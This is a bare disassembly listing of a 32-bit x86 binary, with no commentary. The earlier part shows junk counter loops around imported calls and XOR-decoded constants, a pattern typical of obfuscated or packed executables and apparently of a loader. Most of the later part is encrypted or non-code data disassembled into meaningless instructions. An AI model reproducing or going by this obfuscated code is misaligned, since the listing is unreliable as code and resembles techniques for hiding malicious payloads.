  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4304a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e766,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e766
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e766,ecx
  403899:	cmp    DWORD PTR ds:0x42e766,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e766,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42e9dc
  4038bc:	cmp    DWORD PTR ds:0x42e766,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e766
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e766,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ee28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ee28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ee28,edi
  403903:	cmp    DWORD PTR ds:0x42ee28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42e9f4
  403920:	cmp    DWORD PTR ds:0x42ee28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ee28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ee28,edi
  40393a:	cmp    DWORD PTR ds:0x42ee28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42eb9c
  403988:	cmp    DWORD PTR ds:0x42ee1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4304a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43048e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4304aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4304aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4304aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42e9e0
  403a03:	mov    edi,DWORD PTR ds:0x4304aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4304aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ee30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4304aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43055a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43055a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43055a,edx
  403a58:	cmp    DWORD PTR ds:0x43055a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42e9f8
  403a77:	cmp    DWORD PTR ds:0x43055a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430542,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e75a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43054a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43048a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430592
  403aee:	mov    edx,DWORD PTR ds:0x42e9b0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4304b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4304aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4304aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4304aa,edx
  403b28:	cmp    DWORD PTR ds:0x4304aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eac0
  403b43:	cmp    DWORD PTR ds:0x4304aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4304aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4304aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4304aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430542,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430492,0x430552
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43048e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43048a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4304c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ee20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ee30
  403bc5:	and    ebx,DWORD PTR ds:0x430552
  403bcb:	mov    DWORD PTR ds:0x42ee30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e75a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e75a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e75a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e75a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42e9fc
  403c05:	cmp    DWORD PTR ds:0x42e75a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4304c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43048e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43048e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43048e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea00
  403c4d:	cmp    DWORD PTR ds:0x43048e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43048e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43048e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43048e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43048e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43054e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43054a,0x4304c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430486
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43054a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ee24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43048a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4304ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e776
  403ce8:	adc    DWORD PTR ds:0x42ee10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4304aa
  403cfb:	sbb    DWORD PTR ds:0x42e76e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax+0x4b47326d],0xffffffca
  403d2b:	int    0xb6
  403d2d:	adc    DWORD PTR [esi+0x7e],edi
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403d20
  403d35:	push   ecx
  403d36:	mov    al,0xf1
  403d38:	xchg   edi,eax
  403d39:	fidivr WORD PTR [edx]
  403d3b:	xor    eax,0x289546a1
  403d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d41:	out    dx,eax
  403d42:	fwait
  403d43:	dec    edi
  403d44:	repnz xor BYTE PTR [bx],bh
  403d48:	test   eax,0x1ebca1fd
  403d4d:	jecxz  0x403d1e
  403d4f:	mov    dl,0xb3
  403d51:	mov    dh,0x81
  403d53:	adc    DWORD PTR [esi],ebx
  403d55:	fsubr  st,st(3)
  403d57:	lea    ebp,[ebp-0x4abaf103]
  403d5d:	out    dx,al
  403d5e:	cwde   
  403d5f:	stos   BYTE PTR es:[edi],al
  403d60:	sbb    ebx,ebp
  403d62:	sbb    al,0xc5
  403d64:	mov    al,BYTE PTR [ecx]
  403d66:	adc    al,0xc6
  403d68:	or     DWORD PTR [esi],0xffffff86
  403d6b:	add    ebp,DWORD PTR [esi+0x2]
  403d6e:	jle    0x403d98
  403d70:	enter  0x88cd,0x60
  403d74:	fisubr DWORD PTR [edi+edi*4]
  403d77:	cwde   
  403d78:	cmp    cl,bl
  403d7a:	cmp    ebp,DWORD PTR [ebx]
  403d7c:	xchg   esi,eax
  403d7d:	sub    ch,bh
  403d7f:	jne    0x403d61
  403d81:	mov    bh,0x1b
  403d83:	sbb    bl,dh
  403d85:	fwait
  403d86:	jecxz  0x403d23
  403d88:	in     eax,dx
  403d89:	pop    ds
  403d8a:	sub    al,0x18
  403d8c:	adc    DWORD PTR [edi+0x37],ebp
  403d8f:	test   DWORD PTR [eax+0x618db8d7],edi
  403d95:	sbb    BYTE PTR [ebp-0x46],dh
  403d98:	push   ebx
  403d99:	add    al,0x68
  403d9b:	iret   
  403d9c:	in     eax,dx
  403d9d:	mul    BYTE PTR [esi-0x4358739c]
  403da3:	pop    ss
  403da4:	push   0x33b574f9
  403da9:	push   eax
  403daa:	retf   
  403dab:	(bad)  
  403dac:	mov    ch,0x2c
  403dae:	pop    eax
  403daf:	pop    esi
  403db0:	rcr    edi,1
  403db2:	add    BYTE PTR [esi-0x6ab9a6bf],dl
  403db8:	and    DWORD PTR [ebx+0x33880b6e],0xffffffa1
  403dbf:	jl     0x403d80
  403dc1:	xchg   ebp,eax
  403dc2:	call   0x2c7:0x6fd11d69
  403dc9:	pop    es
  403dca:	fiadd  WORD PTR [esi]
  403dcc:	in     eax,dx
  403dcd:	jmp    0x9be4:0x96041282
  403dd4:	shl    DWORD PTR [ecx+0x795dc32e],cl
  403dda:	lock xchg ebx,eax
  403ddc:	addr16 inc esp
  403dde:	sbb    BYTE PTR [esi+0x2801cb1d],dl
  403de4:	call   DWORD PTR [edx+0x45]
  403de7:	xor    ah,BYTE PTR [ecx+0x1485403d]
  403ded:	out    dx,eax
  403dee:	push   0x147d2ae8
  403df3:	push   ss
  403df4:	xor    ebp,DWORD PTR [ebp-0x4e3e0967]
  403dfa:	(bad)  
  403dfb:	hlt    
  403dfc:	neg    BYTE PTR [ebp+ecx*2-0x6fa579e3]
  403e03:	and    dh,BYTE PTR [esp+edx*2+0x57]
  403e07:	sub    DWORD PTR [edi+edx*8+0x296d0518],esp
  403e0e:	lea    edx,[ebp+ebp*1+0x58c75454]
  403e15:	icebp  
  403e16:	adc    DWORD PTR [edx+ebp*1-0x44eb3aa0],ebp
  403e1d:	(bad)  
  403e1e:	and    al,0x4f
  403e20:	pop    esp
  403e21:	test   esp,ecx
  403e23:	jns    0x403ea3
  403e25:	xor    bl,BYTE PTR [edx]
  403e27:	xchg   esp,ecx
  403e29:	stc    
  403e2a:	sbb    ecx,ebx
  403e2c:	xor    BYTE PTR [edi],cl
  403e2e:	fisubr DWORD PTR ds:0x7c3772b3
  403e34:	mov    bl,0xc1
  403e36:	or     esi,DWORD PTR [esi]
  403e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e39:	xchg   esi,eax
  403e3a:	imul   eax,ecx,0x2c
  403e3d:	sbb    dl,BYTE PTR [ecx+0x5487d6fd]
  403e43:	pop    ss
  403e44:	or     BYTE PTR [ebx+edi*4-0x70],al
  403e48:	std    
  403e49:	sub    DWORD PTR [ecx],esi
  403e4b:	or     BYTE PTR [edi+0xc],0x75
  403e4f:	gs jae 0x403e22
  403e52:	sahf   
  403e53:	xchg   ecx,eax
  403e54:	dec    ebx
  403e55:	aam    0x4c
  403e57:	sub    al,0x5e
  403e59:	adc    esi,ebp
  403e5b:	int    0x91
  403e5d:	sti    
  403e5e:	mov    esp,0x3c11f8f7
  403e63:	sbb    DWORD PTR [ebx-0x9cbad04],edi
  403e69:	cmp    al,0x59
  403e6b:	jecxz  0x403e2a
  403e6d:	hlt    
  403e6e:	fcomp  DWORD PTR [esp+eax*4-0x14]
  403e72:	mov    eax,ds:0x72969d9d
  403e77:	inc    edi
  403e78:	cmp    eax,0x830c0823
  403e7d:	retf   0x4ba4
  403e80:	cdq    
  403e81:	shr    esp,0x23
  403e84:	mov    ch,0x7
  403e86:	and    DWORD PTR [edi],esp
  403e88:	and    BYTE PTR [edi+0x24],bh
  403e8b:	fdiv   QWORD PTR [edx-0x28]
  403e8e:	sub    eax,0x9745dffc
  403e93:	push   edi
  403e94:	sbb    al,0x90
  403e96:	bound  ebp,QWORD PTR [edx-0x11]
  403e99:	fnsave [esi]
  403e9b:	adc    al,0xd5
  403e9d:	test   eax,ebx
  403e9f:	or     DWORD PTR [ebp-0x5134cc00],eax
  403ea5:	xrelease mov DWORD PTR [ebp-0xbf13b6e],ecx
  403eac:	fcom   st(6)
  403eae:	int3   
  403eaf:	add    al,0x5b
  403eb1:	ins    BYTE PTR es:[edi],dx
  403eb2:	mov    ah,0xf
  403eb4:	enter  0x4f78,0x1
  403eb8:	inc    ebp
  403eb9:	or     al,0xc0
  403ebb:	xor    eax,0x74af773
  403ec0:	xchg   BYTE PTR [ebx+0x4ae9d855],cl
  403ec6:	pop    es
  403ec7:	add    BYTE PTR [eax],al
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x757278c4,al
  403efc:	sub    BYTE PTR [edi+0x7e13c3c3],bh
  403f02:	jle    0x403e8f
  403f04:	jg     0x403f84
  403f06:	jle    0x403f50
  403f08:	inc    edi
  403f09:	test   DWORD PTR [ebp-0x1272d9f8],0x13ec5276
  403f13:	pop    esi
  403f14:	mov    eax,ds:0x143a3bf7
  403f19:	sub    DWORD PTR [ecx],ecx
  403f1b:	lds    esi,FWORD PTR [eax]
  403f1d:	cs xchg ecx,eax
  403f1f:	push   ss
  403f20:	jbe    0x403ef1
  403f22:	adc    eax,0x1d70927c
  403f27:	or     eax,0x8a5fa59b
  403f2c:	(bad)  
  403f2d:	(bad)  
  403f2e:	dec    ebx
  403f2f:	push   ebp
  403f30:	cmp    bh,bh
  403f32:	aas    
  403f33:	adc    ebp,DWORD PTR [ecx-0x61b2152c]
  403f39:	aam    0x3e
  403f3b:	aad    0x26
  403f3d:	mov    edx,0x3d1d704c
  403f42:	loop   0x403f89
  403f44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f45:	xchg   ecx,eax
  403f46:	in     al,dx
  403f47:	lea    eax,[ebx]
  403f49:	test   DWORD PTR [edi+0x297e9f88],edi
  403f4f:	aam    0xd6
  403f51:	sub    DWORD PTR [ecx-0x263410ad],0xffffff9a
  403f58:	xlat   BYTE PTR ds:[ebx]
  403f59:	sub    bh,cl
  403f5b:	xchg   esi,edi
  403f5d:	jl     0x403f3b
  403f5f:	(bad)  
  403f60:	into   
  403f61:	iret   
  403f62:	mov    al,0x9d
  403f64:	leave  
  403f65:	aad    0x1f
  403f67:	jno    0x403f73
  403f69:	and    BYTE PTR [ecx],bh
  403f6b:	iret   
  403f6c:	add    ecx,DWORD PTR [esi+0x5bd9f5ab]
  403f72:	inc    esp
  403f73:	fs inc esp
  403f75:	inc    esp
  403f76:	outs   dx,DWORD PTR ds:[esi]
  403f77:	jb     0x403f1f
  403f79:	mov    ebx,0x43a7144
  403f7e:	rcl    esp,0x3d
  403f81:	pushf  
  403f82:	fiadd  WORD PTR [eax+0x15]
  403f85:	push   ebp
  403f86:	xor    DWORD PTR [edi],esi
  403f88:	nop
  403f89:	pop    edx
  403f8a:	add    eax,0x2c5dbaa7
  403f8f:	loopne 0x403ffb
  403f91:	fstp   DWORD PTR [ebp-0x3d]
  403f94:	lahf   
  403f95:	ds popa 
  403f97:	int3   
  403f98:	or     cl,cl
  403f9a:	xchg   ebp,eax
  403f9b:	es add ah,0x6e
  403f9f:	loopne 0x403fa0
  403fa1:	lods   al,BYTE PTR ds:[esi]
  403fa2:	pusha  
  403fa3:	dec    esi
  403fa4:	js     0x404012
  403fa6:	and    al,0x64
  403fa8:	push   0x2e82680
  403fad:	out    dx,eax
  403fae:	mov    ds:0xe206d065,al
  403fb3:	adc    esp,esi
  403fb5:	xlat   BYTE PTR ds:[ebx]
  403fb6:	add    ebp,edi
  403fb8:	jmp    FWORD PTR [ebp+0x3bcf0079]
  403fbe:	dec    ebx
  403fbf:	adc    ebp,DWORD PTR [ecx+ebx*1]
  403fc2:	xlat   BYTE PTR ds:[ebx]
  403fc3:	jns    0x404026
  403fc5:	bound  edi,QWORD PTR [edx-0xc]
  403fc8:	sbb    BYTE PTR [eax],dl
  403fca:	rcl    DWORD PTR [edx],cl
  403fcc:	loope  0x404038
  403fce:	repz sub eax,0xe0bd29ad
  403fd4:	xor    ebx,DWORD PTR [ebx]
  403fd6:	sar    BYTE PTR cs:[ecx-0x72e10ceb],0xbc
  403fde:	push   ecx
  403fdf:	pop    ebx
  403fe0:	jno    0x403fc3
  403fe2:	fstp   QWORD PTR [edx]
  403fe4:	and    DWORD PTR [ebx],edi
  403fe6:	gs jge 0x403f92
  403fe9:	mov    ds:0xa8c3fcd7,al
  403fee:	adc    BYTE PTR [ebx],0x8c
  403ff1:	popf   
  403ff2:	push   eax
  403ff3:	mov    ecx,0x9918e0cf
  403ff8:	mov    gs,WORD PTR [eax-0x3d]
  403ffb:	lock pop ebp
  403ffd:	and    DWORD PTR [ebp-0x7a75cab5],0x2303630
  404007:	jmp    0x92a5:0x109eda2e
  40400e:	mov    esp,esi
  404010:	add    BYTE PTR [ebx-0x5a7bb008],0xc1
  404017:	test   al,0x2f
  404019:	ss std 
  40401b:	inc    ebp
  40401c:	push   0x8bbd52be
  404021:	mov    edx,0x62e68691
  404026:	push   esp
  404027:	std    
  404028:	add    esi,edi
  40402a:	call   0xbe9509bf
  40402f:	mov    al,0xa
  404031:	sti    
  404032:	out    dx,al
  404033:	add    esi,DWORD PTR [edx]
  404035:	jg     0x404092
  404037:	jmp    0xd5eb:0xd8433427
  40403e:	mov    al,0x76
  404040:	jnp    0x404058
  404042:	xchg   edx,eax
  404043:	inc    esp
  404044:	cmp    eax,0x8f310475
  404049:	arpl   WORD PTR [ebx],sp
  40404b:	pushf  
  40404c:	adc    al,0x31
  40404e:	cmp    eax,0xeedbe846
  404053:	cdq    
  404054:	and    al,0x71
  404056:	xchg   esp,eax
  404057:	mov    edx,0x45b691d
  40405c:	ins    DWORD PTR es:[edi],dx
  40405d:	mov    WORD PTR [ecx+0x73cb8271],fs
  404063:	mov    ecx,0xc957adda
  404068:	mov    esi,0xe4130b0c
  40406d:	push   esi
  40406e:	sti    
  40406f:	shl    eax,1
  404071:	or     eax,0x21347034
  404076:	add    al,0x57
  404078:	out    0x9f,al
  40407a:	jle    0x403ffc
  40407c:	sbb    ah,dl
  40407e:	loopne 0x4040fb
  404080:	or     BYTE PTR [edi+0x48f02f6d],cl
  404086:	fsubr  DWORD PTR [edi+0x725080c4]
  40408c:	sar    BYTE PTR [ecx+0x10640dbe],cl
  404092:	inc    edi
  404093:	cmp    eax,0xe9d4558b
  404098:	ja     0x40409f
  40409a:	add    BYTE PTR [eax],al
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax-0x21bc83d2]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x40411c
  4040c0:	ror    ecx,0x9
  4040c3:	adc    dl,BYTE PTR ds:0x946a290b
  4040c9:	xor    dl,BYTE PTR [eax+0x3d4ced60]
  4040cf:	cmp    al,0xcd
  4040d1:	mov    ecx,0xe91746ab
  4040d6:	xor    eax,0xc8daad18
  4040db:	add    esp,DWORD PTR [eax+ecx*2]
  4040de:	jmp    0xbc1a:0xa19ce1fd
  4040e5:	jnp    0x40413d
  4040e7:	jns    0x40412c
  4040e9:	xchg   esi,eax
  4040ea:	fmul   st(1),st
  4040ec:	pop    ds
  4040ed:	not    DWORD PTR [ebx-0x5b]
  4040f0:	mov    ah,BYTE PTR [esi]
  4040f2:	sbb    ecx,esp
  4040f4:	lds    edi,FWORD PTR [edx+0x62]
  4040f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040f8:	add    al,0x3d
  4040fa:	jb     0x40416b
  4040fc:	sar    esp,1
  4040fe:	cld    
  4040ff:	ret    
  404100:	sti    
  404101:	daa    
  404102:	xor    eax,0x36d1c73e
  404107:	mov    ss,edx
  404109:	jl     0x404090
  40410b:	jo     0x4040f3
  40410d:	fdiv   DWORD PTR [eax]
  40410f:	dec    edx
  404110:	mov    edi,0xc099b933
  404115:	imul   esp,DWORD PTR [ebx+0x1c14f3b1],0x33
  40411c:	and    ah,bh
  40411e:	aas    
  40411f:	lods   eax,DWORD PTR ds:[esi]
  404120:	jp     0x40419e
  404122:	sub    al,0x10
  404124:	and    DWORD PTR [esi-0x4bbeff41],ebx
  40412a:	push   0xb749b03d
  40412f:	push   ebx
  404130:	mov    ebx,0x62fb3d64
  404135:	popf   
  404136:	cmp    ah,BYTE PTR [edi+edx*4+0x4e25403a]
  40413d:	mov    eax,0x9a27e76b
  404142:	(bad)  [eax-0x54]
  404145:	out    0x61,al
  404147:	jne    0x4040dc
  404149:	jns    0x4041ca
  40414b:	and    al,0x7a
  40414d:	jmp    0x4546e74d
  404152:	scas   eax,DWORD PTR es:[edi]
  404153:	mov    al,0x86
  404155:	adc    al,0x14
  404157:	pop    edx
  404158:	or     DWORD PTR [eax],eax
  40415a:	(bad)  
  40415b:	ss mov al,0x58
  40415e:	aam    0x69
  404160:	lock in al,0x94
  404163:	fild   WORD PTR [edx+0x6172f7]
  404169:	aam    0xd
  40416b:	lock adc BYTE PTR [ebx+0x4d],al
  40416f:	jmp    0x1bdb:0x8ec86255
  404176:	sti    
  404177:	cmp    al,0xff
  404179:	js     0x404121
  40417b:	add    eax,0x3f876836
  404180:	ret    0xa8e8
  404183:	xchg   esi,eax
  404184:	aas    
  404185:	ins    BYTE PTR es:[edi],dx
  404186:	or     al,0xa3
  404188:	call   0xe35e5e04
  40418d:	sbb    al,0x33
  40418f:	mov    ds:0x433db079,eax
  404194:	rcr    BYTE PTR [ecx+0x75],cl
  404197:	and    eax,0xebfc9636
  40419c:	or     eax,0x91698805
  4041a1:	jns    0x40413c
  4041a3:	lods   al,BYTE PTR ds:[esi]
  4041a4:	pop    esp
  4041a5:	push   ebp
  4041a6:	pop    esi
  4041a7:	mov    ebx,0x6aeff4f0
  4041ac:	shr    esi,0x1d
  4041af:	sbb    dl,BYTE PTR [esi]
  4041b1:	mov    al,0xca
  4041b3:	inc    esi
  4041b4:	xor    al,0xea
  4041b6:	pop    esi
  4041b7:	xor    eax,0x42890890
  4041bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041bd:	dec    eax
  4041be:	adc    DWORD PTR [esi+0x5a80442],esp
  4041c4:	cmp    ch,bh
  4041c6:	stc    
  4041c7:	cmp    ah,bh
  4041c9:	push   0x7a
  4041cb:	out    dx,eax
  4041cc:	sbb    al,0x3d
  4041ce:	fdiv   st(7),st
  4041d0:	push   esp
  4041d1:	std    
  4041d2:	imul   ebp,DWORD PTR ds:0x93788646,0xb18e6502
  4041dc:	out    0x85,al
  4041de:	dec    edx
  4041df:	sub    bh,BYTE PTR [ebx-0x47e2d63a]
  4041e5:	inc    edi
  4041e6:	jl     0x40423f
  4041e8:	cmp    cl,ah
  4041ea:	and    eax,DWORD PTR [edi+0x1c]
  4041ed:	sahf   
  4041ee:	nop
  4041ef:	dec    ecx
  4041f0:	dec    esp
  4041f1:	push   ebp
  4041f2:	xchg   DWORD PTR [esi+eax*2+0x220e7637],esi
  4041f9:	les    edi,FWORD PTR [ecx+0x670ccaee]
  4041ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404200:	mov    WORD PTR [ebx+0x15],ss
  404203:	push   cs
  404204:	jecxz  0x4041d0
  404206:	cmp    cl,BYTE PTR [ebx+0x65]
  404209:	xor    edx,DWORD PTR [edi+esi*4+0x4deff420]
  404210:	popa   
  404211:	pop    ss
  404212:	rol    BYTE PTR [edx+0x30],1
  404215:	mov    ecx,DWORD PTR [edi]
  404217:	sbb    ah,0x21
  40421a:	fdivr  DWORD PTR [ebp+0x6147203a]
  404220:	outs   dx,DWORD PTR ds:[esi]
  404221:	inc    edi
  404222:	or     DWORD PTR [esi+0x74c87c0d],esi
  404228:	ins    BYTE PTR es:[edi],dx
  404229:	or     eax,0xbda18880
  40422e:	hlt    
  40422f:	pop    esp
  404230:	inc    esp
